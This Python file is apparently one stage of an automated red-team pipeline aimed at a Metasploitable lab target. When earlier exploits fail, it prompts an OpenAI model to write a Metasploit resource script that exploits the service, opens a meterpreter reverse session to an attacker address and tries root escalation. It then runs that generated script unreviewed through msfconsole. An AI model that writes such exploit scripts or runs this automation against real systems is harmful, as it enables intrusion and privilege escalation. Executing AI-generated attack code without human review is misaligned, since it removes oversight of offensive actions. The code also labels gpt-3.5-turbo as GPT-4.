#!/usr/bin/env python3
"""
NODE 5.5: GPT FALLBACK EXPLOIT GENERATION
When Node 5 exhausts all exploits with no shell, ask GPT to generate a complete .rc file
"""

import logging
import time
import subprocess
from pathlib import Path
from typing import Dict
import os

try:
    from openai import OpenAI
except ImportError:
    OpenAI = None


def node_5_5_gpt_fallback_exploit(state: Dict) -> Dict:
    """
    NODE 5.5: GPT Fallback Exploit Generation (When Node 5 fails to get shell)

    ═══════════════════════════════════════════════════════════════════════════
    PURPOSE
    ═══════════════════════════════════════════════════════════════════════════

    When Node 5 tries all selected exploits (8 exploits × 10-15 payloads = 120 attempts)
    and gets NO shell, this node:
    1. Takes target info (service, port, OS) from Node 1
    2. Sends to GPT-4 with full context
    3. GPT generates a complete pwn.rc exploitation script
    4. Saves and executes pwn.rc via msfconsole
    5. Gets meterpreter session + privilege escalation in one shot

    ═══════════════════════════════════════════════════════════════════════════
    INPUT STATE REQUIREMENTS (From Nodes 1-5)
    ═══════════════════════════════════════════════════════════════════════════

    From Node 1:
    - target: Target IP address
    - port: Target port
    - service: Service name (ftp, ssh, http, etc.)
    - os_type: Detected OS (Linux, Windows, etc.)
    - msf_client: Metasploit RPC client

    From Node 4-5:
    - lhost: Attacker IP address
    - session_dir: Path to session directory

    Optional:
    - service_version: Service version if detected
    - cve_ids: CVE IDs if provided

    ═══════════════════════════════════════════════════════════════════════════
    OUTPUT STATE UPDATES
    ═══════════════════════════════════════════════════════════════════════════

    On Success:
    - pwn_rc_generated: True
    - pwn_rc_path: Path to generated pwn.rc file
    - pwn_rc_source: "gpt_fallback" (to distinguish from normal Node 6)
    - primary_session_id: Meterpreter session ID
    - primary_session_type: "meterpreter"
    - is_root: True (if privilege escalation successful)
    - privilege_level: "high"

    On Failure:
    - pwn_rc_generated: False
    - error: Error message

    ═══════════════════════════════════════════════════════════════════════════
    """

    logger = logging.getLogger("red_agent.node_5_5")

    logger.info("═" * 80)
    logger.info("NODE 5.5: GPT FALLBACK EXPLOIT GENERATION")
    logger.info("(No shell from Node 5 - asking GPT for help)")
    logger.info("═" * 80)
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 1: VALIDATE INPUT & EXTRACT INFORMATION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 1: Extracting Target Information")
    logger.info("─" * 80)

    target = state.get("target")
    port = state.get("port")
    service = state.get("service", "unknown")
    os_type = state.get("os_type", "Linux")
    lhost = state.get("lhost")
    session_dir = state.get("session_dir")

    # Optional but helpful
    service_version = state.get("service_version", "unknown version")
    cve_ids = state.get("cve_ids", [])

    # Validate required parameters
    if not all([target, port, service]):
        logger.error("❌ Missing required parameters (target, port, service)")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "Missing required: target, port, or service"
        }

    # If lhost not set, try to get from environment
    if not lhost:
        lhost = os.getenv("METASPLOIT_LHOST", "192.168.0.187")
        logger.info(f"ℹ️  LHOST not set, using environment: {lhost}")
        state["lhost"] = lhost

    logger.info(f"✓ Target: {target}:{port}")
    logger.info(f"✓ Service: {service} ({service_version})")
    logger.info(f"✓ OS: {os_type}")
    if cve_ids:
        logger.info(f"✓ CVEs: {', '.join(cve_ids)}")
    logger.info(f"✓ LHOST (Attacker): {lhost}")
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 2: CHECK OPENAI API & READ DEMO TEMPLATE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 2: Checking OpenAI API & Reading Demo Template")
    logger.info("─" * 80)

    # Check OpenAI API key
    openai_api_key = os.getenv("OPENAI_API_KEY")
    if not openai_api_key or openai_api_key == "your_openai_api_key_here":
        logger.error("❌ OPENAI_API_KEY not set in .env file")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "OPENAI_API_KEY not configured"
        }

    if not OpenAI:
        logger.error("❌ OpenAI library not installed")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": "OpenAI library not installed"
        }

    # Read demo pwn.rc template
    demo_pwn_rc = Path(__file__).parent.parent / "pwn.rc"
    if not demo_pwn_rc.exists():
        logger.error(f"❌ Demo pwn.rc template not found at {demo_pwn_rc}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Demo pwn.rc not found at {demo_pwn_rc}"
        }

    try:
        demo_content = demo_pwn_rc.read_text()
        logger.info(f"✓ Loaded demo pwn.rc template ({len(demo_content)} bytes)")
    except Exception as e:
        logger.error(f"❌ Failed to read demo pwn.rc: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to read demo pwn.rc: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 2.5: REGENERATE LPORT (AVOID PORT CONFLICTS FROM NODE 5)
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 2.5: Regenerating LPORT (avoid port conflicts)")
    logger.info("─" * 80)

    import random
    new_lport = random.randint(6000, 6999)  # Use different range than Node 4
    logger.info(f"✓ New LPORT for fallback attempt: {new_lport}")
    logger.info(f"  (Previous LPORT was {state.get('lport', 'unknown')}, now using {new_lport})")
    state["lport"] = new_lport
    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 3: SEND TO GPT FOR PWN.RC GENERATION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 3: Generating pwn.rc via GPT-4")
    logger.info("─" * 80)

    try:
        client = OpenAI(api_key=openai_api_key)

        cve_context = f"CVEs to consider: {', '.join(cve_ids)}" if cve_ids else "No specific CVEs provided"

        prompt = f"""You are a Metasploit pwn.rc file generator for penetration testing.

TARGET INFORMATION:
- IP Address: {target}
- Port: {port}
- Service: {service} ({service_version})
- Operating System: Linux metasploitable 2.6.24-16-server
- {cve_context}

Your task: Generate a complete, production-ready pwn.rc file that will:
1. AUTOMATICALLY find and use the best Metasploit exploit for this {service} service on Linux metasploitable 2.6.24-16-server
2. Select the most compatible payload for Linux metasploitable 2.6.24-16-server
3. Configure LHOST to {lhost} and LPORT to an available port
4. Execute the exploit against {target}:{port}
5. Get a meterpreter session on the target
6. Attempt privilege escalation to root

Important guidelines:
- Use dynamic exploit discovery - search for the best exploit based on service+OS
- Try multiple payloads if the first one fails
- Use proper error handling and logging
- Include helper functions for session management
- Use Ruby syntax for pwn.rc (msfconsole resource script format)

Here is a REAL WORKING EXAMPLE pwn.rc that follows the exact structure you should replicate:

```ruby
{demo_content}
```

NOW: Generate a NEW pwn.rc file optimized for {service} on Linux metasploitable 2.6.24-16-server.

REQUIREMENTS:
- Target service: {service}
- Target OS: Linux metasploitable 2.6.24-16-server (CRITICAL - use this exact OS)
- Use RHOST: {target}
- Use LHOST: {lhost}
- Generate random available LPORT dynamically
- Search for exploits that match "{service}" on "Linux metasploitable"
- Try best payload(s) for successful exploitation
- Include sessions -u upgrade command
- Include privilege escalation attempts suitable for Linux metasploitable
- Use run_single() for all msfconsole commands
- Include comprehensive logging and error handling
- Add wait_for_new_session() helper to detect when exploitation succeeds
- **CONDITIONAL EXIT: Only include run_single("exit") if NO meterpreter session obtained. If meterpreter obtained, KEEP msfconsole open for post-exploitation**

CRITICAL RULES:
- Generate ONLY the pwn.rc Ruby code
- No explanations, no markdown, no code blocks
- Start with: #!/usr/bin/env ruby
- Ensure syntax is 100% valid Ruby and msfconsole compatible
- Do NOT use triple backticks or code markers
"""

        logger.info("Sending request to GPT-4...")
        logger.info(f"  Target: {target}:{port}")
        logger.info(f"  Service: {service}")
        logger.info(f"  OS: {os_type}")

        response = client.chat.completions.create(
            model="gpt-3.5-turbo",
            messages=[
                {
                    "role": "system",
                    "content": "You are an expert Metasploit framework specialist. You generate only Ruby pwn.rc files. Always follow the exact structure from examples. Never add explanations or markdown formatting. Your pwn.rc files must be executable immediately."
                },
                {"role": "user", "content": prompt}
            ],
            temperature=0.2,
            max_tokens=4000
        )

        generated_pwn_rc = response.choices[0].message.content.strip()
        logger.info(f"✓ GPT-4 generated pwn.rc ({len(generated_pwn_rc)} bytes)")

    except Exception as e:
        logger.error(f"❌ GPT-4 generation failed: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"GPT-4 generation failed: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 4: SAVE PWN.RC FILE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 4: Saving Generated pwn.rc")
    logger.info("─" * 80)

    try:
        # Use session_dir if available, otherwise create exploitations folder
        if session_dir:
            exploit_dir = Path(session_dir)
        else:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            exploitations_dir = Path(__file__).parent.parent / "exploitations"
            exploitations_dir.mkdir(exist_ok=True)
            exploit_dir = exploitations_dir / f"node_5_5_gpt_{target}_{port}_{timestamp}"
            exploit_dir.mkdir(exist_ok=True)

        pwn_rc_path = exploit_dir / "generated_pwn.rc"
        pwn_rc_path.write_text(generated_pwn_rc)
        pwn_rc_path.chmod(0o755)  # Make executable
        logger.info(f"✓ Saved pwn.rc to {pwn_rc_path}")

    except Exception as e:
        logger.error(f"❌ Failed to save pwn.rc: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to save pwn.rc: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 5: EXECUTE PWN.RC VIA MSFCONSOLE
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 5: Executing pwn.rc via msfconsole")
    logger.info("─" * 80)

    logger.info(f"Running: msfconsole -q -r {pwn_rc_path}")
    logger.info("Attempting exploitation with GPT-generated script...")
    logger.info("")

    try:
        result = subprocess.run(
            ["msfconsole", "-q", "-r", str(pwn_rc_path)],
            capture_output=False,  # Show output directly
            timeout=300  # 5 minute timeout
        )

        logger.info("")
        logger.info("✓ pwn.rc execution completed")
        logger.info("Waiting for sessions to be registered...")

        # Wait for sessions to be available in MSF RPC
        time.sleep(5)

    except subprocess.TimeoutExpired:
        logger.warning("⚠️  msfconsole execution timed out (still checking sessions...)")
        time.sleep(5)
    except Exception as e:
        logger.error(f"❌ Failed to execute msfconsole: {e}")
        return {
            **state,
            "pwn_rc_generated": False,
            "error": f"Failed to execute msfconsole: {str(e)}"
        }

    logger.info("")

    # ═══════════════════════════════════════════════════════════════════════════
    # STEP 6: CHECK FOR METERPRETER SESSION
    # ═══════════════════════════════════════════════════════════════════════════
    logger.info("STEP 6: Checking for Meterpreter Session")
    logger.info("─" * 80)

    msf_client = state.get("msf_client")
    if not msf_client:
        logger.warning("⚠️  MSF client not available, skipping session check")
        return {
            **state,
            "pwn_rc_generated": True,
            "pwn_rc_path": str(pwn_rc_path),
            "pwn_rc_source": "gpt_fallback",
            "note": "pwn.rc executed, check msfconsole for meterpreter session"
        }

    try:
        time.sleep(5)  # Wait for sessions to be registered
        sessions = msf_client.sessions.list

        meterpreter_sessions = [
            (sid, info) for sid, info in sessions.items()
            if info.get('type') == 'meterpreter'
        ]

        if meterpreter_sessions:
            # Get the latest/highest session ID (most recent)
            meterpreter_sid = max([sid for sid, _ in meterpreter_sessions])
            logger.info(f"✅ Found meterpreter session: {meterpreter_sid}")

            # Check if it's root
            try:
                session = msf_client.sessions.session(meterpreter_sid)
                uid_output = session.run_command("id")
                is_root = "uid=0(root)" in uid_output
                logger.info(f"   User: {'root' if is_root else 'non-root'}")
                logger.info(f"   Output: {uid_output.strip()}")
            except:
                is_root = False

            return {
                **state,
                "pwn_rc_generated": True,
                "pwn_rc_path": str(pwn_rc_path),
                "pwn_rc_source": "gpt_fallback",
                "primary_session_id": meterpreter_sid,
                "primary_session_type": "meterpreter",
                "is_root": is_root,
                "privilege_level": "high" if is_root else "low",
                "next_phase": "post_exploitation"
            }
        else:
            logger.warning("⚠️  No meterpreter session found after execution")
            return {
                **state,
                "pwn_rc_generated": True,
                "pwn_rc_path": str(pwn_rc_path),
                "pwn_rc_source": "gpt_fallback",
                "note": "pwn.rc executed but no meterpreter session detected"
            }

    except Exception as e:
        logger.warning(f"⚠️  Error checking sessions: {e}")
        return {
            **state,
            "pwn_rc_generated": True,
            "pwn_rc_path": str(pwn_rc_path),
            "pwn_rc_source": "gpt_fallback",
            "note": f"pwn.rc executed, error checking sessions: {str(e)}"
        }
